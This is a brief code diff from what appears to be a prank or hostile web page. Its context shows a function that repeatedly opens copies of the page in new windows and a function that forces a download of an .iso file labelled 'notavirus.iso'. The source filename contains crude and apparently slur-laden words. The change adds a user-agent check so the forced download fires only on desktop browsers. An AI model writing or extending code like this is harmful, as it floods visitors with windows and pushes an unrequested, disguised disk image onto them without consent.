@@ -112,7 +112,13 @@ function startSelfClones() {
     window.open('./index.html', '_blank', 'width=800,height=600');
   }, 1200);
 }
- function triggerDownload() {
+function isMobile() {
+  return /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
+}
+
+function triggerDownload() {
+  if (isMobile()) return; // skip download on mobile
+
   const a = document.createElement('a');
   a.href = './audio/notavirustrojanpenisfniga.iso';
   a.download = 'notavirus.iso';
